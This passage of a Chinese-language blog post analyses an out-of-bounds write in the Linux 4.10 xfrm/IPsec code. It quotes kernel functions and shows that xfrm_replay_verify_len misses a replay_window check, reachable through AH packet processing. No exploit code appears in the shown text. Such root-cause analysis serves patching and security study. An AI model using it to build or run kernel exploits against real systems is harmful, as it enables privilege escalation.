<p>回到<code>xfrm_add_sa</code>函数，继续分析<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L528" target="_blank">xfrm_state_construct</a>函数。首先在<code>xfrm_state_alloc</code>中用调用<code>kzalloc</code>函数新建<code>xfrm_state</code>，并拷贝用户数据进行赋值。接下来根据用户输入的各种参数进行类型构建。关于<code>xfrm_replay_state_esn</code>这个结构体在[3]处申请，在[4]处进行验证。</p>
<div class="highlight"><pre><span></span><span class="k">static</span> <span class="k">struct</span> <span class="n">xfrm_state</span> <span class="o">*</span><span class="nf">xfrm_state_construct</span><span class="p">(</span><span class="k">struct</span> <span class="n">net</span> <span class="o">*</span><span class="n">net</span><span class="p">,</span>
                           <span class="k">struct</span> <span class="n">xfrm_usersa_info</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span>
                           <span class="k">struct</span> <span class="n">nlattr</span> <span class="o">**</span><span class="n">attrs</span><span class="p">,</span>
                           <span class="kt">int</span> <span class="o">*</span><span class="n">errp</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">struct</span> <span class="n">xfrm_state</span> <span class="o">*</span><span class="n">x</span> <span class="o">=</span> <span class="n">xfrm_state_alloc</span><span class="p">(</span><span class="n">net</span><span class="p">);</span> <span class="c1">//新建 xfrm_state 结构</span>
    <span class="kt">int</span> <span class="n">err</span> <span class="o">=</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">x</span><span class="p">)</span>
        <span class="k">goto</span> <span class="n">error_no_put</span><span class="p">;</span>

<span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">copy_from_user_state</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>  <span class="c1">//拷贝用户数据</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_SA_EXTRA_FLAGS</span><span class="p">])</span>
        <span class="n">x</span><span class="o">-&gt;</span><span class="n">props</span><span class="p">.</span><span class="n">extra_flags</span> <span class="o">=</span> <span class="n">nla_get_u32</span><span class="p">(</span><span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_SA_EXTRA_FLAGS</span><span class="p">]);</span>

    <span class="k">if</span> <span class="p">((</span><span class="n">err</span> <span class="o">=</span> <span class="n">attach_aead</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_ALG_AEAD</span><span class="p">])))</span>
        <span class="k">goto</span> <span class="n">error</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">err</span> <span class="o">=</span> <span class="n">attach_auth_trunc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">aalg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">props</span><span class="p">.</span><span class="n">aalgo</span><span class="p">,</span>
                     <span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_ALG_AUTH_TRUNC</span><span class="p">])))</span>
        <span class="k">goto</span> <span class="n">error</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">props</span><span class="p">.</span><span class="n">aalgo</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">err</span> <span class="o">=</span> <span class="n">attach_auth</span><span class="p">(</span><span class="o">&amp;</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">aalg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">props</span><span class="p">.</span><span class="n">aalgo</span><span class="p">,</span>
                       <span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_ALG_AUTH</span><span class="p">])))</span>
            <span class="k">goto</span> <span class="n">error</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">err</span> <span class="o">=</span> <span class="n">attach_crypt</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_ALG_CRYPT</span><span class="p">])))</span>
        <span class="k">goto</span> <span class="n">error</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">err</span> <span class="o">=</span> <span class="n">attach_one_algo</span><span class="p">(</span><span class="o">&amp;</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">calg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">props</span><span class="p">.</span><span class="n">calgo</span><span class="p">,</span>
                   <span class="n">xfrm_calg_get_byname</span><span class="p">,</span>
                   <span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_ALG_COMP</span><span class="p">])))</span>
        <span class="k">goto</span> <span class="n">error</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_ENCAP</span><span class="p">])</span> <span class="p">{</span>
        <span class="n">x</span><span class="o">-&gt;</span><span class="n">encap</span> <span class="o">=</span> <span class="n">kmemdup</span><span class="p">(</span><span class="n">nla_data</span><span class="p">(</span><span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_ENCAP</span><span class="p">]),</span>
                   <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">encap</span><span class="p">),</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">encap</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
            <span class="k">goto</span> <span class="n">error</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_TFCPAD</span><span class="p">])</span>
        <span class="n">x</span><span class="o">-&gt;</span><span class="n">tfcpad</span> <span class="o">=</span> <span class="n">nla_get_u32</span><span class="p">(</span><span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_TFCPAD</span><span class="p">]);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_COADDR</span><span class="p">])</span> <span class="p">{</span>
        <span class="n">x</span><span class="o">-&gt;</span><span class="n">coaddr</span> <span class="o">=</span> <span class="n">kmemdup</span><span class="p">(</span><span class="n">nla_data</span><span class="p">(</span><span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_COADDR</span><span class="p">]),</span>
                    <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">coaddr</span><span class="p">),</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">coaddr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
            <span class="k">goto</span> <span class="n">error</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">xfrm_mark_get</span><span class="p">(</span><span class="n">attrs</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">mark</span><span class="p">);</span>

    <span class="n">err</span> <span class="o">=</span> <span class="n">__xfrm_init_state</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span>
        <span class="k">goto</span> <span class="n">error</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_SEC_CTX</span><span class="p">])</span> <span class="p">{</span>
        <span class="n">err</span> <span class="o">=</span> <span class="n">security_xfrm_state_alloc</span><span class="p">(</span><span class="n">x</span><span class="p">,</span>
                        <span class="n">nla_data</span><span class="p">(</span><span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_SEC_CTX</span><span class="p">]));</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span>
            <span class="k">goto</span> <span class="n">error</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1">//对x-&gt;replay_esn、x-&gt;preplay_esn初始化为用户输入XFRMA_REPLAY_ESN_VAL参数</span>
<span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="k">if</span> <span class="p">((</span><span class="n">err</span> <span class="o">=</span> <span class="n">xfrm_alloc_replay_state_esn</span><span class="p">(</span><span class="o">&amp;</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">replay_esn</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">preplay_esn</span><span class="p">,</span>
                           <span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_REPLAY_ESN_VAL</span><span class="p">])))</span>
        <span class="k">goto</span> <span class="n">error</span><span class="p">;</span>

    <span class="n">x</span><span class="o">-&gt;</span><span class="n">km</span><span class="p">.</span><span class="n">seq</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">seq</span><span class="p">;</span>
    <span class="n">x</span><span class="o">-&gt;</span><span class="n">replay_maxdiff</span> <span class="o">=</span> <span class="n">net</span><span class="o">-&gt;</span><span class="n">xfrm</span><span class="p">.</span><span class="n">sysctl_aevent_rseqth</span><span class="p">;</span>
    <span class="cm">/* sysctl_xfrm_aevent_etime is in 100ms units */</span>
    <span class="n">x</span><span class="o">-&gt;</span><span class="n">replay_maxage</span> <span class="o">=</span> <span class="p">(</span><span class="n">net</span><span class="o">-&gt;</span><span class="n">xfrm</span><span class="p">.</span><span class="n">sysctl_aevent_etime</span><span class="o">*</span><span class="n">HZ</span><span class="p">)</span><span class="o">/</span><span class="n">XFRM_AE_ETH_M</span><span class="p">;</span>

<span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="k">if</span> <span class="p">((</span><span class="n">err</span> <span class="o">=</span> <span class="n">xfrm_init_replay</span><span class="p">(</span><span class="n">x</span><span class="p">)))</span><span class="c1">//检查滑动窗口大小及flag，确定检测使用的函数</span>
        <span class="k">goto</span> <span class="n">error</span><span class="p">;</span>

    <span class="cm">/* override default values from above */</span>
    <span class="n">xfrm_update_ae_params</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">attrs</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">x</span><span class="p">;</span>

<span class="nl">error</span><span class="p">:</span>
    <span class="n">x</span><span class="o">-&gt;</span><span class="n">km</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">XFRM_STATE_DEAD</span><span class="p">;</span>
    <span class="n">xfrm_state_put</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
<span class="nl">error_no_put</span><span class="p">:</span>
    <span class="o">*</span><span class="n">errp</span> <span class="o">=</span> <span class="n">err</span><span class="p">;</span>
    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>在<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L421" target="_blank">xfrm_alloc_replay_state_esn</a>中，可以看到通过<code>kzalloc</code>函数分别申请了两块同样大小的内存，大小为<code>sizeof(*replay_esn) + replay_esn-&gt;bmp_len * sizeof(__u32)</code>，并将用户数据中<code>attr[XFRMA_REPLAY_ESN_VAL]</code>内容复制过去。</p>
<pre><code>static int xfrm_alloc_replay_state_esn(struct xfrm_replay_state_esn **replay_esn,
                       struct xfrm_replay_state_esn **preplay_esn,
                       struct nlattr *rta)
{
    struct xfrm_replay_state_esn *p, *pp, *up;
    int klen, ulen;

    if (!rta)
        return 0;

    up = nla_data(rta);
    klen = xfrm_replay_state_esn_len(up);
    ulen = nla_len(rta) &gt;= klen ? klen : sizeof(*up);

    p = kzalloc(klen, GFP_KERNEL);
    if (!p)
        return -ENOMEM;

    pp = kzalloc(klen, GFP_KERNEL);
    if (!pp) {
        kfree(p);
        return -ENOMEM;
    }

    memcpy(p, up, ulen);
    memcpy(pp, up, ulen);

    *replay_esn = p;
    *preplay_esn = pp;

    return 0;
}</code></pre>
<p>最终在<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_replay.c#L585" target="_blank">xfrm_init_replay</a>函数中对上述申请的结构体数据进行检查，<code>replay_window</code>不大于定义的<code>bmp_len</code>大小，并对<code>x-&gt;repl</code>进行初始化，该成员是一个函数虚表，作用是在收到<code>AH</code>或<code>ESP</code>协议数据包时进行数据重放检查。</p>
<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">xfrm_init_replay</span><span class="p">(</span><span class="k">struct</span> <span class="n">xfrm_state</span> <span class="o">*</span><span class="n">x</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">xfrm_replay_state_esn</span> <span class="o">*</span><span class="n">replay_esn</span> <span class="o">=</span> <span class="n">x</span><span class="o">-&gt;</span><span class="n">replay_esn</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">replay_esn</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">replay_esn</span><span class="o">-&gt;</span><span class="n">replay_window</span> <span class="o">&gt;</span>
            <span class="n">replay_esn</span><span class="o">-&gt;</span><span class="n">bmp_len</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">__u32</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span><span class="c1">//不大于bmp本身长度</span>
            <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">props</span><span class="p">.</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">XFRM_STATE_ESN</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">replay_esn</span><span class="o">-&gt;</span><span class="n">replay_window</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
                <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
            <span class="n">x</span><span class="o">-&gt;</span><span class="n">repl</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">xfrm_replay_esn</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span>
            <span class="n">x</span><span class="o">-&gt;</span><span class="n">repl</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">xfrm_replay_bmp</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span>
        <span class="n">x</span><span class="o">-&gt;</span><span class="n">repl</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">xfrm_replay_legacy</span><span class="p">;</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">EXPORT_SYMBOL</span><span class="p">(</span><span class="n">xfrm_init_replay</span><span class="p">);</span>
</pre></div>
<h2 data-content="1" id="69c95908cf01845c8c9d8721e602be7f">xfrm_replay_state_esn结构体更新</h2>
<p>对于一个<code>SA</code>，内核提供修改<code>replay_esn</code> 成员的功能，也就是<code>xfrm_alloc_replay_state_esn</code>申请的第一个内存块。在<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L1926" target="_blank">xfrm_new_ae</a>函数中，首先在[1]处循环查找哈希链表，得到<code>xfrm_state</code>结构体，查找标识是之前提到的三个要素。而在[2]处，对用户输入的<code>attr[XFRMA_REPLAY_ESN_VAL]</code>参数进行检查，也就是修改后的<code>replay_esn</code> 成员内容。最后在[3]处，利用<code>memcpy</code>进行成员内容修改。</p>
<div class="highlight"><pre><span></span><span class="k">static</span> <span class="kt">int</span> <span class="nf">xfrm_new_ae</span><span class="p">(</span><span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">,</span> <span class="k">struct</span> <span class="n">nlmsghdr</span> <span class="o">*</span><span class="n">nlh</span><span class="p">,</span>
        <span class="k">struct</span> <span class="n">nlattr</span> <span class="o">**</span><span class="n">attrs</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">net</span> <span class="o">*</span><span class="n">net</span> <span class="o">=</span> <span class="n">sock_net</span><span class="p">(</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">);</span>
    <span class="k">struct</span> <span class="n">xfrm_state</span> <span class="o">*</span><span class="n">x</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">km_event</span> <span class="n">c</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">err</span> <span class="o">=</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">mark</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">xfrm_mark</span> <span class="n">m</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">xfrm_aevent_id</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">nlmsg_data</span><span class="p">(</span><span class="n">nlh</span><span class="p">);</span>
    <span class="k">struct</span> <span class="n">nlattr</span> <span class="o">*</span><span class="n">rp</span> <span class="o">=</span> <span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_REPLAY_VAL</span><span class="p">];</span>
    <span class="k">struct</span> <span class="n">nlattr</span> <span class="o">*</span><span class="n">re</span> <span class="o">=</span> <span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_REPLAY_ESN_VAL</span><span class="p">];</span>
    <span class="k">struct</span> <span class="n">nlattr</span> <span class="o">*</span><span class="n">lt</span> <span class="o">=</span> <span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_LTIME_VAL</span><span class="p">];</span>
    <span class="k">struct</span> <span class="n">nlattr</span> <span class="o">*</span><span class="n">et</span> <span class="o">=</span> <span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_ETIMER_THRESH</span><span class="p">];</span>
    <span class="k">struct</span> <span class="n">nlattr</span> <span class="o">*</span><span class="n">rt</span> <span class="o">=</span> <span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_REPLAY_THRESH</span><span class="p">];</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">lt</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">rp</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">re</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">et</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">rt</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">err</span><span class="p">;</span>

    <span class="cm">/* pedantic mode - thou shalt sayeth replaceth */</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">nlh</span><span class="o">-&gt;</span><span class="n">nlmsg_flags</span><span class="o">&amp;</span><span class="n">NLM_F_REPLACE</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">err</span><span class="p">;</span>

    <span class="n">mark</span> <span class="o">=</span> <span class="n">xfrm_mark_get</span><span class="p">(</span><span class="n">attrs</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">m</span><span class="p">);</span> <span class="c1">//copy XFRMA_MARK变量，返回值是u32</span>

<span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="n">x</span> <span class="o">=</span> <span class="n">xfrm_state_lookup</span><span class="p">(</span><span class="n">net</span><span class="p">,</span> <span class="n">mark</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">sa_id</span><span class="p">.</span><span class="n">daddr</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">sa_id</span><span class="p">.</span><span class="n">spi</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">sa_id</span><span class="p">.</span><span class="n">proto</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">sa_id</span><span class="p">.</span><span class="n">family</span><span class="p">);</span> <span class="c1">//循环查找hash表，得到xfrm_state结构体</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="n">ESRCH</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">km</span><span class="p">.</span><span class="n">state</span> <span class="o">!=</span> <span class="n">XFRM_STATE_VALID</span><span class="p">)</span>
        <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>

<span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">err</span> <span class="o">=</span> <span class="n">xfrm_replay_verify_len</span><span class="p">(</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">replay_esn</span><span class="p">,</span> <span class="n">re</span><span class="p">);</span> <span class="c1">//XFRMA_REPLAY_ESN_VAL参数检查</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span>
        <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>

    <span class="n">spin_lock_bh</span><span class="p">(</span><span class="o">&amp;</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">lock</span><span class="p">);</span>
<span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="n">xfrm_update_ae_params</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">attrs</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">//memcpy</span>
    <span class="n">spin_unlock_bh</span><span class="p">(</span><span class="o">&amp;</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">lock</span><span class="p">);</span>

    <span class="n">c</span><span class="p">.</span><span class="n">event</span> <span class="o">=</span> <span class="n">nlh</span><span class="o">-&gt;</span><span class="n">nlmsg_type</span><span class="p">;</span>
    <span class="n">c</span><span class="p">.</span><span class="n">seq</span> <span class="o">=</span> <span class="n">nlh</span><span class="o">-&gt;</span><span class="n">nlmsg_seq</span><span class="p">;</span>
    <span class="n">c</span><span class="p">.</span><span class="n">portid</span> <span class="o">=</span> <span class="n">nlh</span><span class="o">-&gt;</span><span class="n">nlmsg_pid</span><span class="p">;</span>
    <span class="n">c</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">aevent</span> <span class="o">=</span> <span class="n">XFRM_AE_CU</span><span class="p">;</span>
    <span class="n">km_state_notify</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">c</span><span class="p">);</span>
    <span class="n">err</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="nl">out</span><span class="p">:</span>
    <span class="n">xfrm_state_put</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">err</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>验证过程在<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L403" target="_blank">xfrm_replay_verify_len</a>函数中，可见在检查过程中主要检查了修改部分的<code>bmp_len</code>长度，该检查是因为<code>replay_esn</code>成员内存是直接进行复制的，不再二次分配。但缺少了对<code>replay_window</code>变量的检测，<strong>导致引用<code>replay_window</code>变量进行<code>bitmap</code>读写时造成的数组越界问题</strong>。</p>
<pre><code>static inline int xfrm_replay_verify_len(struct xfrm_replay_state_esn *replay_esn,
                     struct nlattr *rp)
{
    struct xfrm_replay_state_esn *up;
    int ulen;

    if (!replay_esn || !rp)
        return 0;

    up = nla_data(rp);
    ulen = xfrm_replay_state_esn_len(up);

    if (nla_len(rp) &lt; ulen || xfrm_replay_state_esn_len(replay_esn) != ulen) //自身长度逻辑正确，ulen与原len相同
        return -EINVAL;

    return 0;
}</code></pre>
<h2 data-content="1" id="7de375dc2b946a87975f40082f78be4b">数组越界写定位</h2>
<p>通过对<code>xfrm</code>模块代码中，<code>replay_window</code>关键字的查找，可以发现主要对这个关键字的操作位于<code>xfrm_replay_advance_esn</code>和<code>xfrm_replay_check_esn</code>函数中。而通过这两个函数的查找发现二者位于同一 结构体<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_replay.c#L578" target="_blank">xfrm_replay_esn</a>下，</p>
<div class="highlight"><pre><span></span><span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">xfrm_replay</span> <span class="n">xfrm_replay_esn</span> <span class="o">=</span> <span class="p">{</span>
    <span class="p">.</span><span class="n">advance</span>    <span class="o">=</span> <span class="n">xfrm_replay_advance_esn</span><span class="p">,</span>
    <span class="p">.</span><span class="n">check</span>      <span class="o">=</span> <span class="n">xfrm_replay_check_esn</span><span class="p">,</span>
    <span class="p">.</span><span class="n">recheck</span>    <span class="o">=</span> <span class="n">xfrm_replay_recheck_esn</span><span class="p">,</span>
    <span class="p">.</span><span class="n">notify</span>     <span class="o">=</span> <span class="n">xfrm_replay_notify_esn</span><span class="p">,</span>
    <span class="p">.</span><span class="n">overflow</span>   <span class="o">=</span> <span class="n">xfrm_replay_overflow_esn</span><span class="p">,</span>
<span class="p">};</span>
</pre></div>
<p>而定义这个结构体，可以发现这个结构体在之前提到过的<code>xfrm_init_replay</code>函数中被使用，并为<code>x-&gt;repl</code>成员赋值，因此转而寻找<code>x-&gt;repl</code>成员被调用的位置，最终跟踪到了<code>xfrm_input</code>函数，而<code>xfrm_input</code>函数之前被<a href="https://elixir.bootlin.com/linux/v4.10.6/source/include/net/xfrm.h#L1523" target="_blank">xfrm4_rcv_spi</a> &lt;= <a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/ipv4/xfrm4_input.c#L155" target="_blank">xfrm4_rcv</a> &lt;= <a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/ipv4/xfrm4_protocol.c#L118" target="_blank">xfrm4_ah_rcv</a> 最终追溯到<code>AH</code>协议的内核协议栈中。</p>
<div class="highlight"><pre><span></span><span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">net_protocol</span> <span class="n">ah4_protocol</span> <span class="o">=</span> <span class="p">{</span>
    <span class="p">.</span><span class="n">handler</span>    <span class="o">=</span>   <span class="n">xfrm4_ah_rcv</span><span class="p">,</span>
    <span class="p">.</span><span class="n">err_handler</span>    <span class="o">=</span>   <span class="n">xfrm4_ah_err</span><span class="p">,</span>
    <span class="p">.</span><span class="n">no_policy</span>  <span class="o">=</span>   <span class="mi">1</span><span class="p">,</span>
    <span class="p">.</span><span class="n">netns_ok</span>   <span class="o">=</span>   <span class="mi">1</span><span class="p">,</span>
<span class="p">};</span>
</pre></div>
<p>可见，通过发送<code>AH</code>数据包可以触发越界读写。</p>
<p>在<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_input.c#L182" target="_blank">xfrm_input</a>函数中，首先在[1]处利用<code>AH</code>数据包数据找到对应的<code>SA</code>，在[2]处调用<code>xfrm_replay_check_esn</code>进行检查，再调用<code>xfrm_replay_recheck_esn</code>再次检查，最终在[3]处调用<code>xfrm_replay_advance_esn</code>。</p>
<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">xfrm_input</span><span class="p">(</span><span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">,</span> <span class="kt">int</span> <span class="n">nexthdr</span><span class="p">,</span> <span class="n">__be32</span> <span class="n">spi</span><span class="p">,</span> <span class="kt">int</span> <span class="n">encap_type</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">net</span> <span class="o">*</span><span class="n">net</span> <span class="o">=</span> <span class="n">dev_net</span><span class="p">(</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">dev</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
    <span class="n">__be32</span> <span class="n">seq</span><span class="p">;</span>
    <span class="n">__be32</span> <span class="n">seq_hi</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">xfrm_state</span> <span class="o">*</span><span class="n">x</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">xfrm_address_t</span> <span class="o">*</span><span class="n">daddr</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">xfrm_mode</span> <span class="o">*</span><span class="n">inner_mode</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">mark</span> <span class="o">=</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">mark</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">family</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">decaps</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">async</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="cm">/* A negative encap_type indicates async resumption. */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">encap_type</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//here is zero</span>
        <span class="n">async</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">xfrm_input_state</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span>
        <span class="n">seq</span> <span class="o">=</span> <span class="n">XFRM_SKB_CB</span><span class="p">(</span><span class="n">skb</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">seq</span><span class="p">.</span><span class="n">input</span><span class="p">.</span><span class="n">low</span><span class="p">;</span>
